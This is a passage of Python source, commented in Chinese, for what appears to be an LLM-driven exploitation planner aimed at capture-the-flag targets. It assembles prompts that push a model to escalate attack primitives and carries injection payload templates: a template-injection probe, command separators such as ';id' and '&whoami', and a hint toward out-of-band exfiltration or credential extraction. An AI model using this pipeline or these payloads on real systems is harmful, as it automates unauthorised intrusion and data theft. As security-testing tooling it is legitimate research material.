    lines.append("    1. 先问：当前 primitive 是什么？")
    lines.append("    2. 再问：primitive 下一阶段是什么？（查 transition graph）")
    lines.append("    3. 最后：哪个 payload 能实例化该 primitive？（从 primitive 的 payload_templates 选）")
    lines.append("")
    lines.append("  payload 只是 primitive 的实例化 —— primitive 才是攻击的本质。")
    lines.append("  你不能直接思考 '下一个 payload 是什么'，你只能思考 'primitive 如何升级'。")
    lines.append("")

    # Entry primitives based on CWE
    entry_primitives = graph.get_entry_primitives(cwe_ids)
    active_primitives = traj.get_primitive_chain()
    current_primitive = traj.get_current_primitive()

    if entry_primitives and not active_primitives:
        lines.append(f"── 🚪 推荐入口 Primitive（基于 CWE {', '.join(cwe_ids[:3])}）──")
        for pid in entry_primitives:
            p = registry.get(pid)
            if p:
                lines.append(f"  ▸ {pid}: {p.description}")
                if p.payload_templates:
                    lines.append(f"    实例化示例: {p.payload_templates[0]}")
        lines.append("")

    # Current state vs primitive context
    if current_primitive:
        lines.append(f"── 🎯 当前 Primitive: {current_primitive} ──")
        # Next upgrade targets
        next_prims = graph.get_next_primitives(current_primitive)
        if next_prims:
            lines.append("  🔼 推荐升级目标（优先选择）：")
            for np_id in next_prims:
                p = registry.get(np_id)
                cond = graph.get_transition_condition(current_primitive, np_id)
                if p:
                    lines.append(f"    → {np_id}: {p.description[:100]}")
                    lines.append(f"      条件: {cond}")
                    if p.payload_templates:
                        lines.append(f"      实例化: {p.payload_templates[0]}")
        else:
            lines.append("  （已到达该链顶端，考虑 OOB exfiltration 或 credential extraction）")
        lines.append("")

    # Primitive transition graph
    graph_lines = graph.build_planner_context(active_primitives if active_primitives else None)
    # We already rendered the graph info inline above, so just add transition rules
    lines.append("")
    lines.append("【Primitive 升级规则 — 必须遵守！】")
    lines.append("  1. 每轮至少尝试一次 primitive 升级（沿 graph 中边向前推进）")
    lines.append("  2. 如果升级失败：记录失败原因（哪个 precondition 未满足）→ 调整 precondition")
    lines.append("  3. 不要在同级 primitive 上反复尝试不同 payload —— 那是随机漫游")
    lines.append("  4. 不要退回已确认的 primitive —— 只能前进，不能回退")
    lines.append("  5. payload 选择：先确定目标 primitive → 查其 payload_templates → 选择合适的实例")

    # Cross-target generalization hint
    lines.append("")
    lines.append("【Cross-Target Generalization — 跨目标迁移】")
    lines.append("  同一个 primitive 在不同引擎/框架中有不同的 payload 语法，但本质相同：")
    lines.append("    template_expression_execution: jinja2={{...}}, freemarker=${...}, thymeleaf=#{...}, ejs=<%=...%>")
    lines.append("    command_separator_injection: unix=;id, windows=&whoami, powershell=;Get-ChildItem")
    lines.append("  当遇到新目标时：1) 判断引擎/框架 2) 查找对应语法 3) 从 primitive 实例化")
    lines.append("  不要重新发明 payload——只需做语法适配。")

    # Learned primitives
    learned_ctx = learning.build_planner_context()
    if "尚未学习到" not in learned_ctx:
        lines.append("")
        lines.append(learned_ctx)

    lines.append("")
    lines.append("╚══════════════════════════════════════════════════════════════╝")

    return "\n".join(lines)


def run_planner(
    settings: Settings,
    memory: LayeredMemory,
    confirmed: dict[str, Any],
    feedback: dict[str, Any] | None,
    out_path: Path,
    llm: DeepSeekClient | None,
    adapter: ChallengeAdapter | None = None,
    trusted_selection: dict[str, Any] | None = None,
) -> dict[str, Any]:
    if settings.mock_llm or llm is None:
        plan = _mock_plan(confirmed, memory)
        try:
            _mock_selection = _select_cwe_templates(
                confirmed.get("vulnerabilities", []),
                confirmed,
                state=(feedback or {}).get("current_exploit_state", ""),
            )
            plan["template_selection"] = _mock_selection.to_dict()
        except Exception:
            pass
        if trusted_selection:
            allowed = trusted_selection.get("allowed_canonical_strategy_ids") or []
            plan["trusted_run_id"] = trusted_selection.get("run_id")
            plan["trusted_round"] = trusted_selection.get("round")
            plan["trusted_selection_hash"] = trusted_selection.get("selection_hash")
            plan["selected_canonical_strategy_id"] = allowed[0] if allowed else ""
        if feedback:
            plan["prior_feedback"] = feedback
        plan["attempted_strategy"] = build_attempted_strategy(confirmed, plan, source="mock_planner")
        out_path.parent.mkdir(parents=True, exist_ok=True)
        out_path.write_text(json.dumps(plan, ensure_ascii=False, indent=2), encoding="utf-8")
        return plan

    vuln_summary = confirmed.get("title", "") or confirmed.get("description", "") or ""

    # 🔑 RAG 检索：按 CWE + 漏洞描述 + 上轮报错精准匹配三层记忆
    memory_context = _build_memory_context(memory, confirmed, feedback)

    # ── Fix #1: prior_feedback 裁剪 — 仅保留 Planner 实际消费的 14 个字段 ──
    _planner_feedback_fields = [
        "feedback_for_planner", "summary", "current_exploit_state",
        "state_transition_blocker", "next_required_action",
        "milestones_achieved", "confidence", "repro_success", "errors",
        "_fsm_constraints", "_distilled_trace", "target_facts",
        "last_execution_raw", "prior_history_state",
        "strategy_health", "surface_still_valid", "required_action",
    ]
    if feedback:
        _filtered_feedback = {
            k: feedback[k] for k in _planner_feedback_fields if k in feedback
        }
        _before_tok = len(json.dumps(feedback, ensure_ascii=False, default=str))
        _after_tok = len(json.dumps(_filtered_feedback, ensure_ascii=False, default=str))
        _reduction_pct = (1 - _after_tok / max(_before_tok, 1)) * 100
        print(f"[planner] prior_feedback trim: {_before_tok} → {_after_tok} chars ({_reduction_pct:.1f}% reduction)")
        # ── DEBUG INSTRUMENTATION: prior_feedback 实际内容 ──
        print("==== PRIOR FEEDBACK KEYS ====")
        print(sorted(feedback.keys()))
        print("==== PRIOR FEEDBACK (full, max 5000 chars) ====")
        print(json.dumps(feedback, ensure_ascii=False, indent=2, default=str)[:5000])
        print("==== FIELDS CHECK ====")
        print("FSM_CONSTRAINTS_PRESENT =", "_fsm_constraints" in feedback)
        print("NEXT_REQUIRED_ACTION =", feedback.get("next_required_action"))
        print("STATE_TRANSITION_BLOCKER =", feedback.get("state_transition_blocker"))
        print("REPRO_SUCCESS =", feedback.get("repro_success"))
        # ── END DEBUG ──
    else:
        print("==== PRIOR FEEDBACK: None (first iteration, no prior feedback) ====")
        _filtered_feedback = {}

    # ── Diagnostic: extract rejected hypotheses from feedback, inject as field #2 ──
    _rejected_hypotheses = (feedback or {}).get("_rejected_hypotheses")
    if _rejected_hypotheses:
        _rej_summary = ", ".join(
            f"{h.get('fingerprint','?')}({h.get('attempts','?')}att/{h.get('successes','?')}succ)"
            for h in _rejected_hypotheses
        )
        print(f"[planner] rejected_hypotheses injected: [{_rej_summary}]")
    else:
        print("[planner] rejected_hypotheses: (none — first iteration or no rejections yet)")

    user = {
        "confirmed_vuln": confirmed,
        "rejected_hypotheses": _rejected_hypotheses or [],
        "layered_memory": json.loads(memory.planning_context()),
        "retrieved_experience": memory_context,
        "prior_feedback": _filtered_feedback,
        "last_execution_raw": (feedback or {}).get("last_execution_raw", {}),
    }

    _current_state = (feedback or {}).get("current_exploit_state", "")
    template_selection = _select_cwe_templates(
        confirmed.get("vulnerabilities", []),
        confirmed,
        state=_current_state,
    )
    user["trusted_template_selection"] = {
        "run_id": (trusted_selection or {}).get("run_id"),
        "round": (trusted_selection or {}).get("round"),
        "selection_hash": (trusted_selection or {}).get("selection_hash"),
        "status": (trusted_selection or {}).get("status"),
        "allowed_canonical_strategy_ids": (trusted_selection or {}).get("allowed_canonical_strategy_ids") or [],
        "migration_report": (trusted_selection or {}).get("migration_report") or [],
        "non_executable_templates": (trusted_selection or {}).get("non_executable_templates") or [],
    }
    if template_selection.status == "ALL_MATCHED_STRATEGIES_REJECTED":
        user["template_selection_notice"] = _NO_AVAILABLE_STRATEGY_BLOCK
    core_logic = _extract_user_goal_dense(confirmed, adapter=adapter, state=_current_state)

    if core_logic.startswith("【严重配置错误】"):
        print(f"[planner] ⚠️ {core_logic}")
        plan = {
            "version": 1,
            "plan_id": "plan_config_error",
            "vuln_summary": "CONFIG_ERROR",
            "rationale": core_logic,
            "steps": [],
            "error": "config",
            "platform": platform.system(),
        }
        plan["attempted_strategy"] = build_attempted_strategy(confirmed, plan, source="mock_planner")
        out_path.parent.mkdir(parents=True, exist_ok=True)
        out_path.write_text(json.dumps(plan, ensure_ascii=False, indent=2), encoding="utf-8")
        return plan

    # ═══════════════════════════════════════════════════════════════════
    # Tasks 3+4: Strict Physical Memory Budgeting + Attention Routing
    #
    # 六层注意力拓扑图（位置 1-6，严格不可重排）：
    #   [L1 头部] Runtime Manifest — 最高指导原则
    #   [L2]     Hard Constraints & Banned Imports
    #   [L3]     SDK API Contract
    #   [L4]     Verified Facts & Memory Context
    #   [L5]     Dehydrated Trajectory State (compact JSON)
    #   [L6 尾部] User Goal — 裁剪后的攻击目标摘要
    #
    # 每一层由 MEMORY_BUDGET 物理硬截断；
    # 最终 total payload 由 _FINAL_PAYLOAD_HARD_CAP 再次双保险切片。
    # ═══════════════════════════════════════════════════════════════════

    # ── L1: Runtime Manifest (absolute head — zero hallucination) ──
    l1 = _apply_memory_budget("runtime_constraints", _build_runtime_manifest_block())

    # ── L2: Hard Constraints (bans + forbidden techniques blacklist) ──
    l2 = _build_hard_constraints_block()
    if template_selection.status == "ALL_MATCHED_STRATEGIES_REJECTED":
        l2 = _NO_AVAILABLE_STRATEGY_BLOCK + "\n\n" + l2
    if feedback:
        forbidden_block = _build_forbidden_techniques_block(feedback)
        if forbidden_block:
            l2 = forbidden_block + "\n\n" + l2
            print(f"[planner] 失败指纹黑名单已合并到 L2 硬约束")
    l2 = _apply_memory_budget("hard_constraints", l2)

    # ── L2.5: Exploit FSM Capability State (fed from Coordinator via feedback) ──
    fsm_constraints = (feedback or {}).get("_fsm_constraints", "")
    l2_5 = _physical_truncate(fsm_constraints, 600) if fsm_constraints else ""

    # ── L3: SDK API Contract ──
    l3 = _apply_memory_budget("sdk_contract", _build_sdk_contract_block())

    # ── L4: Verified Facts (primitive context + verification + memory + distilled trace) ──
    l4_parts: list[str] = []

    # RuntimeTruths: deterministic target facts (highest L4 priority — top position)
    target_facts = (feedback or {}).get("target_facts", "")
    if target_facts:
        l4_parts.insert(0, _physical_truncate(target_facts, 200))

    # Distilled execution trace (replaces raw transcript/HTML dumping)
    distilled_trace = (feedback or {}).get("_distilled_trace", "")
    if distilled_trace:
        l4_parts.insert(0, _physical_truncate(distilled_trace, 400))

    # 注入点摘要注入 L4（高注意力权重区锚定）
    _inj_vuln = (confirmed.get("vulnerabilities") or [{}])[0] if confirmed else {}
    _src_code = (_inj_vuln.get("source") or {}).get("code", "")
    _param_m = re.search(r'name\s*=\s*["\'](\w+)["\']', _src_code) if _src_code else None
    if _param_m:
        _pname = _param_m.group(1)
        # 从 RuntimeTruths 读取已确认的 HTTP 方法，不要硬编码 GET
        try:
            from memory.runtime_truths import get_runtime_truths
            _rtt = get_runtime_truths()
            _method = str(_rtt.get("confirmed_render_method") or _rtt.get("form_method") or "POST")
        except Exception:
            _method = "POST"
        l4_parts.insert(0, f"[已确认注入点] HTTP参数: ?{_pname}=<PAYLOAD> | 端点: {_method} / | 必须通过此参数传递攻击载荷")

    primitive_context = _build_primitive_context(confirmed)
    if primitive_context:
        l4_parts.append(_physical_truncate(primitive_context, 500))

    verif = get_verification()
    verif_context = verif.build_planner_context()
    if verif_context and verif.get_stats()["facts_count"] > 0:
        l4_parts.append(_physical_truncate(verif_context, 300))

    if memory_context:
        l4_parts.append(_physical_truncate(memory_context, 400))

    l4 = _apply_memory_budget("verified_facts", "\n\n".join(l4_parts)) if l4_parts else ""

    # ── L5: Trajectory State (dehydrated compact JSON, ~300 char budget) ──
    traj = get_trajectory()
    traj_context = _build_trajectory_context(traj)
    l5 = _apply_memory_budget("trajectory_state", traj_context) if traj_context else ""

    # ── L6: Structured Observation (absolute tail — whitelist only, 800 char hard cap) ──
    # 只允许 OBSERVED / FAILED / ERRORS 结构化字段
    # 禁止: raw stdout、HTML body、chain_output、payload 原文、stacktrace
    l6 = _build_l6_structured_observation(feedback, confirmed, core_logic)

    # Strict order assembly: HIGH_PRIORITY_LESSONS → L1→L2→L2.5(FSM)→L3→L4→L5→L6
    # HIGH_PRIORITY_LESSONS is prepended to give Planner immediate awareness of known pitfalls
    l0_lessons = _build_high_priority_lessons(
        feedback,
        verif=get_verification(),
        distiller_fingerprints=(feedback or {}).get("_distiller_fingerprints", []),
    )
    system_prompt_with_memory = "\n\n".join(
        p for p in [l0_lessons, l1, l2, l2_5, l3, l4, l5, l6] if p
    )

    # ── P0: 系统级输出格式指令（json_mode 保证 JSON，但内容结构靠此约束）──
    _output_schema_directive = (
        "OUTPUT: return one JSON object. Top-level fields are required: "
        "selected_canonical_strategy_id, trusted_run_id, trusted_round, "
        "trusted_selection_hash, steps. selected_canonical_strategy_id MUST be one "
        "of trusted_template_selection.allowed_canonical_strategy_ids. "
        "Do not output confirmed_vuln or template_selection. "
        "Example: {\"selected_canonical_strategy_id\":\"...\",\"trusted_run_id\":\"...\","
        "\"trusted_round\":0,\"trusted_selection_hash\":\"...\","
        "\"steps\":[{\"id\":\"step-1\",\"type\":\"python\",\"command\":\"print('STEP_OK')\"}]}"
    )
    system_prompt_with_memory = _output_schema_directive + "\n\n" + system_prompt_with_memory

    # ── 双保险：物理硬截断到 _FINAL_PAYLOAD_HARD_CAP ──
    if len(system_prompt_with_memory) > _FINAL_PAYLOAD_HARD_CAP:
        system_prompt_with_memory = _physical_truncate(system_prompt_with_memory, _FINAL_PAYLOAD_HARD_CAP)
        print(f"[planner] ⚠️ 双保险触发！total > {_FINAL_PAYLOAD_HARD_CAP}，已强制物理截断")

    print(
        f"[planner] 内存预算: L1={len(l1)} L2={len(l2)} L2.5={len(l2_5)} L3={len(l3)} "
        f"L4={len(l4)} L5={len(l5)} L6={len(l6)} total={len(system_prompt_with_memory)}"
    )

    if feedback:
        fb_planner = feedback.get("feedback_for_planner", "")
        fb_summary = feedback.get("summary", "")
        fb_confidence = feedback.get("confidence", 0)
        fb_success = feedback.get("repro_success", False)
        fb_errors = feedback.get("errors", []) if isinstance(feedback.get("errors"), list) else []
        fb_parts = [
            f"confidence={fb_confidence} | repro_success={fb_success}",
        ]
        # 🔑 攻击状态机字段 — 最高优先级展示，Planner 必须据此决定本轮策略
        fb_state = feedback.get("current_exploit_state", "")
        fb_milestones = feedback.get("milestones_achieved", [])
        fb_blocker = feedback.get("state_transition_blocker", "")
        fb_next_action = feedback.get("next_required_action", "")
        if fb_state:
            fb_parts.append(f"当前攻击状态: {fb_state}")
        if fb_milestones:
            fb_parts.append(f"已达成里程碑: {'; '.join(fb_milestones[:3])}")
        if fb_blocker:
            fb_parts.append(f"状态阻塞点: {fb_blocker}")
        if fb_next_action:
            fb_parts.append(f"下一步: {fb_next_action}")
        if fb_summary:
            fb_parts.append(f"summary: {fb_summary[:200]}")
        if fb_planner:
            fb_parts.append(f"feedback: {fb_planner[:500]}")
        if fb_errors:
            fb_parts.append(f"errors: {'; '.join(str(e)[:100] for e in fb_errors[:3])}")

        # 🔑 前轮 history_state 注入：强制 Planner 感知已尝试的 payload 历史
        prior_history = feedback.get("prior_history_state")
        if prior_history and isinstance(prior_history, dict):
            tried = prior_history.get("tried_payloads", [])
            failed = prior_history.get("failed_reasons", [])
            cat_fails = prior_history.get("consecutive_failures_per_category", {})
            history_lines = []
            if tried:
                history_lines.append(f"  已尝试Payload（严禁重复!）: {', '.join(tried[:5])}")
            if failed:
                history_lines.append(f"  历史失败原因: {'; '.join(failed[:3])}")
            if cat_fails:
                cat_str = ", ".join(f"{k}={v}次" for k, v in cat_fails.items())
                history_lines.append(f"  分类失败计数: {cat_str}")
                over_threshold = [k for k, v in cat_fails.items() if v >= 3]
                if over_threshold:
                    history_lines.append(
                        f"  以下路径已达失败上限，强制切换: {', '.join(over_threshold)}"
                    )
            if history_lines:
                fb_parts.append("history_state:\n" + "\n".join(history_lines))

        # 注入压缩后的执行摘要（蒸馏版，不含原始 transcript/HTML）
        dist_trace = feedback.get("_distilled_trace", "")
        if dist_trace:
            # Already injected in L4 — here we just note it exists for the
            # feedback section, at most 100 chars to avoid duplication
            system_prompt_with_memory += (
                "\n[蒸馏执行摘要已注入 L4 层 — 见上方 distilled trace]"
            )

        feedback_block = (
            "\n\n【上一轮执行反馈 — 必须阅读并修正！】\n"
            + "\n".join(f"  • {p}" for p in fb_parts)
            + "\n\n请根据以上反馈修正攻击计划。必须优先考虑当前攻击状态和状态转换阻塞点。"
        )
        # ── DEBUG INSTRUMENTATION: feedback block 截断前后 ──
        print("==== FEEDBACK BLOCK BEFORE TRUNCATE ====")
        print(feedback_block)
        print("LEN=", len(feedback_block))
        # ── END DEBUG ──
        truncated_block = _physical_truncate(feedback_block, 800)
        # ── DEBUG INSTRUMENTATION: 截断后 ──
        print("==== FEEDBACK BLOCK AFTER TRUNCATE ====")
        print(truncated_block)
        print("LEN=", len(truncated_block))
        # ── END DEBUG ──
        system_prompt_with_memory += truncated_block

    # ── 最终双保险：所有内容拼接完毕后再次物理硬截断 ──
    if len(system_prompt_with_memory) > _FINAL_PAYLOAD_HARD_CAP:
        system_prompt_with_memory = _physical_truncate(system_prompt_with_memory, _FINAL_PAYLOAD_HARD_CAP)
        print(f"[planner] ⚠️ 最终双保险触发！total > {_FINAL_PAYLOAD_HARD_CAP}，已强制物理截断")

    print(
        f"[planner] 最终 payload: total={len(system_prompt_with_memory)} chars "
        f"(L1={len(l1)} L2={len(l2)} L2.5={len(l2_5)} L3={len(l3)} L4={len(l4)} L5={len(l5)} L6={len(l6)})"
    )

    # ── P0: Empty steps retry loop — 空 plans 强制触发 LLM 重试 ──
    MAX_STEPS_RETRIES = 2
    plan = None
    for steps_attempt in range(MAX_STEPS_RETRIES + 1):
        try:
            # ═══════════════════════════════════════════════════════════════
            # TOKEN BUDGET REPORT — 统计最终发送给 LLM 的 token 分布
            # ═══════════════════════════════════════════════════════════════
            user_payload = json.dumps(user, ensure_ascii=False)

            # Token estimator: try tiktoken, fallback to chars/3.5
            def _est_tok(text: str) -> int:
                try:
                    import tiktoken
                    enc = tiktoken.get_encoding("cl100k_base")
                    return len(enc.encode(text))
                except Exception:
                    return int(len(text) / 3.5)

            # ── System prompt components ──
            sys_items: list[tuple[str, int]] = []
            sys_items.append(("system:output_directive", _est_tok(_output_schema_directive)))
            sys_items.append(("system:L0_high_priority_lessons", _est_tok(l0_lessons)))
            sys_items.append(("system:L1_runtime_manifest", _est_tok(l1)))
            sys_items.append(("system:L2_hard_constraints", _est_tok(l2)))
            if l2_5:
                sys_items.append(("system:L2.5_fsm_constraints", _est_tok(l2_5)))
            sys_items.append(("system:L3_sdk_contract", _est_tok(l3)))
            # L4 sub-components
            if l4_parts:
                l4_sub_labels = ["target_facts", "distilled_trace", "injection_point",
                                 "primitive_context", "verif_context", "memory_context"]
                for idx, part in enumerate(l4_parts):
                    label = l4_sub_labels[idx] if idx < len(l4_sub_labels) else f"l4_part_{idx}"
                    sys_items.append((f"system:L4_{label}", _est_tok(part)))
            sys_items.append(("system:L4_total_joined", _est_tok(l4)))
            sys_items.append(("system:L5_trajectory_state", _est_tok(l5)))
            sys_items.append(("system:L6_structured_obs", _est_tok(l6)))
            sys_total_tok = _est_tok(system_prompt_with_memory)
            sys_items.append(("system:TOTAL", sys_total_tok))

            # ── User prompt components ──
            usr_items: list[tuple[str, int]] = []
            usr_items.append(("user:confirmed_vuln", _est_tok(json.dumps(user.get("confirmed_vuln", {}), ensure_ascii=False))))
            usr_items.append(("user:layered_memory", _est_tok(json.dumps(user.get("layered_memory", {}), ensure_ascii=False))))
            usr_items.append(("user:retrieved_experience", _est_tok(str(user.get("retrieved_experience", "")))))
            # prior_feedback: 同时报告裁剪前/后
            _pf_now = _est_tok(json.dumps(user.get("prior_feedback", {}), ensure_ascii=False, default=str))
            _pf_before = _est_tok(json.dumps(feedback, ensure_ascii=False, default=str)) if feedback else 0
            _pf_reduction = (1 - _pf_now / max(_pf_before, 1)) * 100 if _pf_before > 0 else 0
            usr_items.append(("user:prior_feedback (trimmed)", _pf_now))
            if _pf_before > _pf_now:
                usr_items.append((f"user:prior_feedback (raw, {_pf_reduction:.0f}% cut)", _pf_before))
            usr_items.append(("user:last_execution_raw", _est_tok(json.dumps(user.get("last_execution_raw", {}), ensure_ascii=False, default=str))))
            usr_total_tok = _est_tok(user_payload)
            usr_items.append(("user:TOTAL", usr_total_tok))

            # ── Combine + sort descending ──
            all_items = sys_items + usr_items
            all_items.sort(key=lambda x: x[1], reverse=True)

            print("=" * 80)
            print(f"[planner] ╔══════════════════════════════════════════════════╗")
            print(f"[planner] ║  TOKEN BUDGET REPORT — prompt token breakdown  ║")
            print(f"[planner] ╚══════════════════════════════════════════════════╝")
            print(f"[planner] attempt: {steps_attempt + 1}/{MAX_STEPS_RETRIES + 1}")
            print(f"[planner] system_prompt chars:  {len(system_prompt_with_memory):>7}  est_tokens: {sys_total_tok:>6}")
            print(f"[planner] user_payload chars:   {len(user_payload):>7}  est_tokens: {usr_total_tok:>6}")
            print(f"[planner] ─────────────────────────────────────────────")
            print(f"[planner] GRAND TOTAL est:      {sys_total_tok + usr_total_tok:>6} tokens")
            print(f"[planner] ── ALL COMPONENTS (sorted by tokens, desc) ──")
            for name, tok in all_items:
                bar = "█" * max(1, tok // 20) if tok > 0 else ""
                print(f"[planner]   {tok:>6}  {name:<50} {bar}")
            print(f"[planner] ── TOP 5 TOKEN CONSUMERS ──")
            for rank, (name, tok) in enumerate(all_items[:5], 1):
                pct = (tok / max(sys_total_tok + usr_total_tok, 1)) * 100
                print(f"[planner]   #{rank}: {name:<50} {tok:>6} tokens ({pct:.1f}%)")
            print("=" * 80)

            # ── DEBUG INSTRUMENTATION: 保存最终 Prompt ──
            _debug_dir = out_path.parent
            (_debug_dir / "debug_system_prompt.txt").write_text(
                system_prompt_with_memory, encoding="utf-8"
            )
            (_debug_dir / "debug_user_prompt.txt").write_text(
                user_payload if isinstance(user_payload, str) else json.dumps(user_payload, ensure_ascii=False, indent=2),
                encoding="utf-8"
            )
            print(f"[planner] DEBUG: prompts saved to {_debug_dir}/debug_system_prompt.txt and debug_user_prompt.txt")
            print("==== FINAL SYSTEM PROMPT LEN ====")
            print(len(system_prompt_with_memory))
            print("==== FINAL USER PROMPT LEN ====")
            print(len(user_payload))
            # ── END DEBUG ──
            plan = llm.complete_json(
                system_prompt_with_memory,
                user_payload,
            )

            # ── DIAGNOSTIC: dump parsed plan ──
            print(f"[planner] DIAGNOSTIC — parsed plan keys: {list(plan.keys())}")
            steps_raw = plan.get("steps")
            print(f"[planner] DIAGNOSTIC — steps type={type(steps_raw).__name__} len={len(steps_raw) if isinstance(steps_raw, list) else 'N/A'}")
            if isinstance(steps_raw, list) and len(steps_raw) > 0:
                print(f"[planner] DIAGNOSTIC — steps[0] keys: {list(steps_raw[0].keys()) if isinstance(steps_raw[0], dict) else type(steps_raw[0]).__name__}")
            print(f"[planner] DIAGNOSTIC — plan sample (first 1500 chars):")
            print(json.dumps(plan, ensure_ascii=False, indent=2)[:1500])
            print("=" * 80)
        except SchemaValidationError:
            if steps_attempt < MAX_STEPS_RETRIES:
                print(f"[planner] LLM 返回了非 dict，触发重试 ({steps_attempt + 1}/{MAX_STEPS_RETRIES + 1})")
                continue
            raise

        plan.setdefault("version", 1)
        plan["platform"] = platform.system()
        plan["template_selection"] = template_selection.to_dict()

        # ── P0: 自动解包 LLM 常见的错误嵌套格式 ──
        # 模型经常把 steps 包在 plan / attack_plan 里，直接解包提升鲁棒性
        if "steps" not in plan or not isinstance(plan.get("steps"), list) or len(plan.get("steps", [])) == 0:
            unwrapped = False
            # 模式 1: {"plan": {"steps": [...]}} → 提取内层
            if isinstance(plan.get("plan"), dict) and isinstance(plan["plan"].get("steps"), list) and len(plan["plan"]["steps"]) > 0:
                plan["steps"] = plan["plan"]["steps"]
                unwrapped = True
                print("[planner] 🔧 自动解包: plan.plan.steps → steps")
            # 模式 2: {"plan": [...]} → 直接作为 steps
            elif isinstance(plan.get("plan"), list) and len(plan["plan"]) > 0:
                plan["steps"] = plan["plan"]
                unwrapped = True
                print("[planner] 🔧 自动解包: plan.plan[] → steps")
            # 模式 3: {"attack_plan": {"steps": [...]}} → 提取内层
            elif isinstance(plan.get("attack_plan"), dict) and isinstance(plan["attack_plan"].get("steps"), list) and len(plan["attack_plan"]["steps"]) > 0:
                plan["steps"] = plan["attack_plan"]["steps"]
                unwrapped = True
                print("[planner] 🔧 自动解包: plan.attack_plan.steps → steps")
            # 模式 4: {"attack_plan": [...]} → 直接作为 steps
            elif isinstance(plan.get("attack_plan"), list) and len(plan["attack_plan"]) > 0:
                plan["steps"] = plan["attack_plan"]
                unwrapped = True
                print("[planner] 🔧 自动解包: plan.attack_plan[] → steps")
            if unwrapped:
                # 清理解包后的残留字段，避免干扰后续处理
                for _k in ("plan", "attack_plan"):
                    if _k in plan and _k != "steps":
                        del plan[_k]

        steps = plan.get("steps")
        if isinstance(steps, list) and len(steps) > 0:
            if len(steps) > 3:
                steps = steps[:3]
                plan["steps"] = steps
                print(f"[planner] ⚠️ steps 超限截断: {len(steps)} -> 3")
            break  # valid plan with steps
        print(f"[planner] ⚠️ steps 数组为空，触发 LLM 重试 ({steps_attempt + 1}/{MAX_STEPS_RETRIES + 1})")
        # escalating temperature to nudge LLM out of non-response
        # (temperature is controlled inside complete_json per-attempt, so we rely on retry)

    # Final guard: if still empty after all retries, raise hard error
    if plan is None or (isinstance(plan.get("steps"), list) and len(plan["steps"]) == 0):
        raise SchemaValidationError("steps 数组不能为空 — LLM 多次重试后仍未生成有效步骤")

    # Task 6: Extract structured AST metadata from each step
    plan = _extract_plan_ast(plan)

    # normalize_plan 必须在 _extract_plan_ast 之后运行，
    # 以覆盖 AST mode → LEGACY 并强制 step id 归一化
    plan = normalize_plan(plan)
    plan["attempted_strategy"] = build_attempted_strategy(confirmed, plan, source="planner")

    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_text(json.dumps(plan, ensure_ascii=False, indent=2), encoding="utf-8")
    return plan

def _build_l6_structured_observation(
    feedback: dict[str, Any] | None,
    confirmed: dict[str, Any],
    core_logic: str,
) -> str:
    """Build whitelist-filtered L6 observation block.

    Only allows: OBSERVED / FAILED / ERRORS structured lines.
    Banned: raw stdout, HTML body, chain_output, payload原文, stacktrace.
    Hard cap: 800 chars enforced by MEMORY_BUDGET + inline slicing.
    """
    if feedback is None:
        vulns = confirmed.get("vulnerabilities", [])
        cwes = list(set(v.get("cwe_id", "") for v in vulns if v.get("cwe_id")))
        target = confirmed.get("target_context", {}).get("base_url", "unknown")
        lines = [f"TARGET: {target}", f"CWE: {', '.join(cwes[:5])}", "GOAL: exploit and capture flag"]
        return "\n".join(lines)

    lines: list[str] = []

    # ── OBSERVED: from detected_primitives + milestones ──
    observed_parts: list[str] = []
    for pid in (feedback.get("detected_primitives") or [])[:5]:
        conf = (feedback.get("primitive_confidence") or {}).get(pid, 0)
        observed_parts.append(f"{pid}={conf:.0%}")
    milestones = feedback.get("milestones_achieved") or []
    for m in milestones[:3]:
        if isinstance(m, str):
            tag = m.split(":")[0].strip()[:40]
            if tag and tag not in " ".join(observed_parts):
                observed_parts.append(tag)
    if observed_parts:
        lines.append("OBSERVED: " + ", ".join(observed_parts))

    # ── FAILED: from last_execution_raw structured summary (no raw stdout) ──
    last_exec = feedback.get("last_execution_raw") or {}
    failed_ids = last_exec.get("failed_steps") or []
    if failed_ids:
        lines.append(f"FAILED: {', '.join(str(s) for s in failed_ids[:5])}")
    elif feedback.get("error_fingerprint"):
        fp = feedback.get("error_fingerprint", "")
        if fp and fp != "no_failures":
            lines.append(f"FAILED: {fp[:80]}")

    # ── ERRORS: from state_transition_blocker ──
    blocker = feedback.get("state_transition_blocker", "")
    error_parts: list[str] = []
    if blocker:
        error_parts.append(blocker[:60])
    if error_parts:
        lines.append("ERRORS: " + "; ".join(error_parts))

    # ── Fallback: if nothing extracted, keep minimal goal line ──
    if not lines:
        cwes = list(set(
            v.get("cwe_id", "") for v in confirmed.get("vulnerabilities", []) if v.get("cwe_id")
        ))
        return f"TARGET: {confirmed.get('target_context', {}).get('base_url', 'unknown')}\nCWE: {', '.join(cwes[:5])}"

    return "\n".join(lines)


def _build_user_goal_block_fn(vuln: dict, goal_text: str) -> str:
    param_name = "text"
    source_code = (vuln.get("source") or {}).get("code", "")
    m = re.search(r'name\s*=\s*["\'](\w+)["\']', source_code)
    if m:
        param_name = m.group(1)

    placeholder = "TEXT"
    for ev in (vuln.get("evidence") or []):
        code = ev.get("code", "")
        m2 = re.search(r'"([A-Z_]{2,})"', code)
        if m2:
            placeholder = m2.group(1)
            break

    # 只在确实有注入点信息时才加前缀，避免对没有 source 字段的题目造成干扰
    if not source_code:
        return goal_text

    injection_prefix = (
        f"[关键注入点 — 必须使用]\n"
        f"端点: GET /?{param_name}=<PAYLOAD>\n"
        f"模板占位符: {placeholder} 被参数值替换后送入模板引擎执行\n"
        f"探测: GET /?{param_name}=%23set(%24x%3D7*7)%24%7Bx%7D → 响应含49即确认注入\n"
        f"禁止裸访问 GET / — 每个step必须携带 ?{param_name}= 参数\n"
        f"--- 任务目标 ---\n"
    )
    return injection_prefix + goal_text